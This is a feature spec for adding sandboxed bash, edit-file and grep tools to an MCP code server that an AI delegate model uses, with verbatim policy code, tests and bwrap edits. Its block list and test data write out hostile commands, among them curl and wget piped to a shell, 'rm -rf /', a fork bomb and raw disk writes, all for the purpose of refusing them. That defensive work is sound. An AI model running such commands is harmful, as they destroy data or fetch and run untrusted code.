# Feature Spec: 01 — shell tools in the sandboxed code server (bash, edit_file, grep)

**Status:** ready
**Date:** 2026-10-29
**Blocked by:** none

The delegate model needs a shell, an exact-text editor and a capped grep inside a sandbox that limits everything it can reach. This ticket adds a read-only view of the host to the existing bwrap runner, a command policy, and three tools on the existing `code` MCP server.

## Context

- **Objective:** shell tools in the sandboxed code server (bash, edit_file, grep). Code is written and tested in a scratch copy; you transcribe it.
- **Role:** strict systems architect; you are transcribing an approved implementation.
- **Source:** `/mnt/School/PhD/AI231/AI-231-ME3-agy/.scratch/onit-tools/PLAN.md` and `EXPERIMENT.md`.
- **Repo:** the working directory you were given (a copy of `/mnt/School/PhD/AI231/AI-231-ME3-agy`).

| File | Action | Line cap |
|---|---|---|
| `src/voice_agent/mcp_servers/shell_policy.py` | new, verbatim | **42** (skeleton 38) |
| `tests/mcp_servers/test_shell_policy.py` | new, verbatim | **57** (skeleton 45) |
| `tests/mcp_servers/test_shell_tools.py` | new, verbatim | **98** (skeleton 78) |
| `tests/sandbox/test_host_readonly.py` | new, verbatim | **35** (skeleton 28) |
| `src/voice_agent/sandbox/runner.py` | edit (list below) | **369** (now 360; exactly 366 after the edits) |
| `src/voice_agent/mcp_servers/code.py` | edit (list below) | **520** (now 421; exactly 517 after the edits) |

**Non-goals / touch nothing else:** no change to `run_python`, `publish_site`, `_paths.py`, the speech or media servers, or any other existing test. No `serve` tool (a later ticket). No network access for the agent.

**Security-sensitive:** yes — it lets a model run commands. Keep to the code as written; do not weaken or extend the policy, and do not change any bwrap flag.

## Diagrams

```mermaid
flowchart LR
    A["agent (later ticket)"] -- "bash / edit_file / grep" --> C["code server: tools (changed)"]
    C -- "check_command (new)" --> S["shell_policy.py (new)"]
    C -- "SandboxPolicy host_readonly (new)" --> R["runner.build_command (changed)"]
    R -- "bwrap argv" --> B[("bwrap: host ro, /sandbox rw, no net")]
```

## RECAP

### E — Edges

| Edge | Behaviour |
|---|---|
| `bash` with a command `check_command` refuses | raises `ValueError(<one sentence>)`; nothing runs |
| `bash` while bwrap or systemd-run is missing | `ValueError("sandbox unavailable: ...")` (from `SandboxUnavailable`) |
| `bash` timeout above 120 or below 1 | clamped to 1..120 |
| `bash` writes outside `/sandbox`, reads `/home`, opens a socket | fails inside the sandbox (read-only host dirs, `/home` not mounted, `--unshare-all` without `--share-net`) |
| `edit_file` with `old` absent, repeated, or empty | `ValueError("old text must occur exactly once in <path>; it occurs N times")` |
| `edit_file` / `grep` path outside the root or a symlink | `ValueError("path outside sandbox root")` |
| `grep` no match | returns `"no matches"` |
| `grep` more than 50 lines, lines over 300 characters, output over 20 KiB | cut to those caps |

### A — Assumptions and how they were checked

- bwrap, systemd-run and prlimit work on this laptop: `preflight().problems == []` and a real `run_in_sandbox` of `python3 -c "print(1+1)"` returned `2`.
- `pytest` is not installed in the system Python (`/usr/bin/python3 -c "import pytest"` fails), so the sandboxed agent cannot run pytest; its tests use `unittest`.
- The runner's existing default (`host_readonly=False`) is unchanged: the existing sandbox and code-server tests still pass with the edits.

### R — Rules

Copy every code block byte for byte. The sandbox is the real fence; `check_command` is only the first one, so do not add patterns to it.

## C — Contracts (the code; copy it)

#### `src/voice_agent/mcp_servers/shell_policy.py` (new, verbatim)

```python
from __future__ import annotations

import re
import shlex

BLOCKED = frozenset(
    {"sudo", "su", "doas", "ssh", "scp", "sftp", "docker", "podman", "systemctl", "shutdown"}
    | {"reboot", "poweroff", "halt", "mount", "umount", "chroot", "nc", "ncat", "telnet"}
)
_SEGMENT = re.compile(r"\|\||&&|[;|&\n]")
_PIPE_TO_SHELL = re.compile(r"\b(curl|wget)\b[^|;&\n]*\|\s*(ba|z|da)?sh\b")
_FORK_BOMB = re.compile(r":\(\)\s*\{")
_WIPE_TARGETS = ("/", "/*", "~", "~/", "$HOME")


def check_command(command: str) -> str | None:
    """The refusal sentence for a command the agent may not run, or None (first fence only)."""
    if _PIPE_TO_SHELL.search(command) or _FORK_BOMB.search(command):
        return "I can't run that: it downloads and runs code, or it is a fork bomb."
    for segment in _SEGMENT.split(command):
        try:
            words = shlex.split(segment)
        except ValueError:
            words = segment.split()
        while words and "=" in words[0]:
            words = words[1:]
        if not words:
            continue
        name = words[0].lstrip("({`$").rsplit("/", 1)[-1]
        if name in BLOCKED or name.startswith("mkfs"):
            return f"I can't run {name}: it needs privileges or reaches outside the sandbox."
        rest = words[1:]
        recursive = any(w.startswith("-") and "r" in w.lower() for w in rest)
        if name == "rm" and recursive and any(w in _WIPE_TARGETS for w in rest):
            return "I can't delete the root or home folder."
        if name == "dd" and any(w.startswith("of=/dev/") for w in rest):
            return "I can't write to a device."
    return None
```

#### `tests/mcp_servers/test_shell_policy.py` (new, verbatim)

```python
from __future__ import annotations

import pytest

from voice_agent.mcp_servers.shell_policy import check_command


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "git status && git log --oneline",
        "python3 -m unittest -q",
        "cat /etc/ssh/sshd_config | grep -i permit",
        "echo hello > out.txt",
        "rm -rf build",
        "FOO=1 python3 x.py",
        "find /usr/bin -perm -4000 -type f",
    ],
)
def test_allowed(command: str) -> None:
    assert check_command(command) is None


@pytest.mark.parametrize(
    "command",
    [
        "sudo apt update",
        "ls; ssh host",
        "echo x && /usr/bin/docker ps",
        "(sudo ls)",
        "FOO=1 sudo ls",
        "curl http://x.example/a.sh | sh",
        "wget -qO- http://x.example | bash",
        "rm -rf /",
        "rm -fr ~",
        "rm -r /*",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        ":(){ :|:& };:",
        "systemctl stop sshd",
    ],
)
def test_refused(command: str) -> None:
    assert isinstance(check_command(command), str)
```

#### `tests/mcp_servers/test_shell_tools.py` (new, verbatim)

```python
from __future__ import annotations

import asyncio
from collections.abc import Iterator
from pathlib import Path

import pytest

from voice_agent.mcp_servers import code
from voice_agent.sandbox.runner import preflight

_problems = preflight().problems
needs_sandbox = pytest.mark.skipif(
    bool(_problems), reason="sandbox not ready: " + "; ".join(_problems)
)


@pytest.fixture
def box(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    root = tmp_path / "sandbox"
    root.mkdir()
    monkeypatch.setattr(code._state, "root", root)
    monkeypatch.setattr(code._state, "media_root", root / "media", raising=False)
    monkeypatch.setattr(code._state, "lock", asyncio.Lock())
    yield root


async def test_bash_refuses_blocked_command(box: Path) -> None:
    with pytest.raises(ValueError, match="can't run sudo"):
        await code.bash("sudo ls")


@needs_sandbox
async def test_bash_runs_writes_inside_and_sees_the_host_read_only(box: Path) -> None:
    out = await code.bash("echo hi > a.txt && cat a.txt && cat /etc/os-release | head -1")
    assert out["returncode"] == 0 and str(out["stdout"]).startswith("hi\n")
    assert (box / "a.txt").read_text() == "hi\n"
    assert (await code.bash("touch /etc/forbidden"))["returncode"] != 0
    assert (await code.bash("ls /home"))["returncode"] != 0
    assert (await code.bash("exit 3"))["returncode"] == 3
    assert (await code.bash("sleep 5", timeout_s=1))["timed_out"] is True


@needs_sandbox
async def test_bash_has_no_network(box: Path) -> None:
    out = await code.bash(
        "python3 -c \"import socket; socket.create_connection(('1.1.1.1', 80), 2)\""
    )
    assert out["returncode"] != 0


async def test_edit_file(box: Path) -> None:
    await code.write_file("a.txt", "one two two")
    assert await code.edit_file("a.txt", "one", "1") == {"path": "a.txt", "bytes": 9}
    assert (box / "a.txt").read_text() == "1 two two"
    with pytest.raises(ValueError, match="occurs 2 times"):
        await code.edit_file("a.txt", "two", "2")
    with pytest.raises(ValueError, match="occurs 0 times"):
        await code.edit_file("a.txt", "zzz", "2")
    with pytest.raises(ValueError, match="outside sandbox root"):
        await code.edit_file("../a.txt", "1", "2")
    with pytest.raises(ValueError, match="not found"):
        await code.edit_file("missing.txt", "1", "2")


@needs_sandbox
async def test_grep(box: Path) -> None:
    await code.write_file("src/a.py", "alpha\nbeta\n")
    await code.write_file("src/b.txt", "beta\n")
    assert await code.grep("alp", "src") == "src/a.py:1:alpha"
    assert (await code.grep("beta", ".", "*.py")).splitlines() == ["src/a.py:2:beta"]
    assert await code.grep("zzz") == "no matches"
    await code.write_file("many.txt", "".join(f"hit {i}\n" for i in range(80)))
    assert len((await code.grep("hit", "many.txt")).splitlines()) == 50
    await code.write_file("wide.txt", "x" * 1000)
    assert len(await code.grep("x+", "wide.txt")) <= 300
    with pytest.raises(ValueError, match="outside sandbox root"):
        await code.grep("a", "..")
```

#### `tests/sandbox/test_host_readonly.py` (new, verbatim)

```python
from __future__ import annotations

from pathlib import Path

from voice_agent.sandbox.runner import HostLayout, SandboxPolicy, build_command

LAYOUT = HostLayout(
    usr_merged={"/bin": True, "/lib": True, "/sbin": True},
    has_lib64=False,
    has_etc_alternatives=True,
)


def test_default_policy_keeps_only_usr_and_alternatives() -> None:
    cmd = build_command(SandboxPolicy(root=Path("/r")), ["true"], LAYOUT)
    assert "/etc/alternatives" in cmd
    assert "/var" not in cmd


def test_host_readonly_binds_host_dirs_read_only_and_never_home() -> None:
    cmd = build_command(SandboxPolicy(root=Path("/r"), host_readonly=True), ["true"], LAYOUT)
    assert "/etc/alternatives" not in cmd
    for host in ("/etc", "/var"):
        i = cmd.index(host)
        assert cmd[i - 1] == "--ro-bind" and cmd[i + 1] == host
    assert "/home" not in cmd
    assert "--unshare-all" in cmd and "--share-net" not in cmd
    assert cmd[cmd.index("--bind") + 2] == "/sandbox"
```

#### `src/voice_agent/sandbox/runner.py` (edit list, apply in order; each OLD block occurs exactly once at the moment you apply it)

**Edit 1 of 3.** Replace OLD with NEW.

OLD:

```text
_MAX_SCAN_ENTRIES = 200_000
```

NEW:

```text
_MAX_SCAN_ENTRIES = 200_000
_HOST_RO_DIRS = ("/etc", "/opt", "/srv", "/var")
```

**Edit 2 of 3.** Replace OLD with NEW.

OLD:

```text
    info_fd: int | None = None


@dataclass(frozen=True)
class HostLayout:```

NEW:

```text
    info_fd: int | None = None
    host_readonly: bool = False


@dataclass(frozen=True)
class HostLayout:```

**Edit 3 of 3.** Replace OLD with NEW.

OLD:

```text
    if layout.has_etc_alternatives:
        cmd += ["--ro-bind", "/etc/alternatives", "/etc/alternatives"]
```

NEW:

```text
    if policy.host_readonly:
        for host in _HOST_RO_DIRS:
            if Path(host).is_dir():
                cmd += ["--ro-bind", host, host]
    elif layout.has_etc_alternatives:
        cmd += ["--ro-bind", "/etc/alternatives", "/etc/alternatives"]
```

#### `src/voice_agent/mcp_servers/code.py` (edit list, apply in order; each OLD block occurs exactly once at the moment you apply it)

**Edit 1 of 3.** Replace OLD with NEW.

OLD:

```text
from voice_agent.sandbox.runner import (```

NEW:

```text
from voice_agent.mcp_servers.shell_policy import check_command
from voice_agent.sandbox.runner import (```

**Edit 2 of 3.** Replace OLD with NEW.

OLD:

```text
MAX_LIST_BYTES = 32 * 1024
```

NEW:

```text
MAX_LIST_BYTES = 32 * 1024
MAX_GREP_MATCHES = 50
MAX_GREP_BYTES = 20 * 1024
MAX_GREP_LINE = 300
```

**Edit 3 of 3.** Replace OLD with NEW.

OLD:

```text
@dataclass
class _Tally:```

NEW:

```text
def _policy(timeout_s: int, *, host_readonly: bool = False) -> SandboxPolicy:
    real_root = _state.root.resolve()
    hidden = _media_rel()
    if hidden is not None and _hidden_has_symlink(real_root, hidden):
        raise ValueError(f"refusing to run: {hidden} inside the sandbox is a symlink")
    return SandboxPolicy(
        root=real_root,
        timeout_s=max(1, min(timeout_s, MAX_RUN_TIMEOUT_S)),
        hidden_paths=(hidden,) if hidden else (),
        host_readonly=host_readonly,
    )


@mcp.tool()
async def bash(command: str, timeout_s: int = 60) -> dict[str, object]:
    """Run a shell command in the isolated sandbox.

    The machine is visible read-only, only the working folder is writable, there is no network,
    and sudo, ssh and similar commands are refused.
    """
    refusal = check_command(command)
    if refusal is not None:
        raise ValueError(refusal)
    async with _state.lock:
        policy = _policy(timeout_s, host_readonly=True)
        try:
            result = await run_in_sandbox(policy, ["bash", "-c", command])
        except SandboxUnavailable as exc:
            raise ValueError(str(exc)) from None
    if result.disk_exceeded:
        raise ValueError("sandbox folder is over the limit; delete or shrink files, then retry")
    return {
        "returncode": result.returncode,
        "stdout": result.stdout,
        "stderr": result.stderr,
        "timed_out": result.timed_out,
        "duration_s": result.duration_s,
    }


@mcp.tool()
async def edit_file(path: str, old: str, new: str) -> dict[str, object]:
    """Replace one exact piece of text in a file under the sandbox folder (`old` occurs once)."""
    async with _state.lock:
        try:
            with open_regular_for_read(_state.root, path) as fh:
                text = fh.read(MAX_WRITE_BYTES + 1).decode("utf-8", errors="replace")
        except PathEscapeError:
            raise _escape_error() from None
        except FileNotFoundError:
            raise ValueError(f"file not found: {path}") from None
        except IsADirectoryError:
            raise ValueError(f"not a file: {path}") from None
        count = text.count(old)
        if not old or count != 1:
            raise ValueError(f"old text must occur exactly once in {path}; it occurs {count} times")
        data = text.replace(old, new).encode("utf-8")
        if len(data) > MAX_WRITE_BYTES:
            raise ValueError(f"file too large: {len(data)} bytes exceeds {MAX_WRITE_BYTES}")

        def writer(fh: BinaryIO) -> None:
            fh.write(data)

        try:
            write_file_atomic(_state.root, path, writer, overwrite=True)
        except PathEscapeError:
            raise _escape_error() from None
    return {"path": path, "bytes": len(data)}


@mcp.tool()
async def grep(pattern: str, path: str = ".", glob: str | None = None) -> str:
    """Search files under the sandbox folder for a regex; returns up to 50 file:line:text lines."""
    async with _state.lock:
        target = _resolve(path, must_exist=True)
        rel = target.relative_to(_state.root.resolve()).as_posix()
        argv = ["grep", "-rnIE"]
        if glob:
            argv += ["--include", glob]
        argv += ["-e", pattern, "--", "/sandbox" if rel == "." else f"/sandbox/{rel}"]
        try:
            result = await run_in_sandbox(_policy(20), argv)
        except SandboxUnavailable as exc:
            raise ValueError(str(exc)) from None
    if result.returncode == 1:
        return "no matches"
    if result.returncode != 0:
        raise ValueError(result.stderr.strip()[:200] or "grep failed")
    lines = [ln.removeprefix("/sandbox/")[:MAX_GREP_LINE] for ln in result.stdout.splitlines()]
    return "\n".join(lines[:MAX_GREP_MATCHES])[:MAX_GREP_BYTES]


@dataclass
class _Tally:```


### Function inventory

- `src/voice_agent/mcp_servers/shell_policy.py`: top-level `check_command`
- `tests/mcp_servers/test_shell_policy.py`: top-level `test_allowed`, `test_refused`
- `tests/mcp_servers/test_shell_tools.py`: top-level `box`, `test_bash_refuses_blocked_command`, `test_bash_runs_writes_inside_and_sees_the_host_read_only`, `test_bash_has_no_network`, `test_edit_file`, `test_grep`
- `tests/sandbox/test_host_readonly.py`: top-level `test_default_policy_keeps_only_usr_and_alternatives`, `test_host_readonly_binds_host_dirs_read_only_and_never_home`

## P — Proof

Run from the repository root of your working copy. Run exactly these, in this order.

1. `uv run --offline --group laptop ruff check src/voice_agent/mcp_servers/shell_policy.py src/voice_agent/mcp_servers/code.py src/voice_agent/sandbox/runner.py tests/mcp_servers/test_shell_policy.py tests/mcp_servers/test_shell_tools.py tests/sandbox/test_host_readonly.py`
   Expected last line (ignore the timing): `All checks passed!`
2. `uv run --offline --group laptop ruff format --check src/voice_agent/mcp_servers/shell_policy.py src/voice_agent/mcp_servers/code.py src/voice_agent/sandbox/runner.py tests/mcp_servers/test_shell_policy.py tests/mcp_servers/test_shell_tools.py tests/sandbox/test_host_readonly.py`
   Expected last line (ignore the timing): `6 files already formatted`
3. `uv run --offline --group laptop mypy src/voice_agent/mcp_servers/shell_policy.py src/voice_agent/mcp_servers/code.py src/voice_agent/sandbox/runner.py`
   Expected last line (ignore the timing): `Success: no issues found in 3 source files`
4. `uv run --offline --group laptop pytest -q tests/mcp_servers/test_shell_policy.py tests/mcp_servers/test_shell_tools.py tests/sandbox/test_host_readonly.py`
   Expected last line (ignore the timing): `29 passed`
5. `uv run --offline --group laptop pytest -q tests/mcp_servers/test_code_server.py tests/sandbox`
   Expected last line (ignore the timing): `78 passed, 6 skipped`

## Execution Log

(append dated entries below; never rewrite earlier ones)
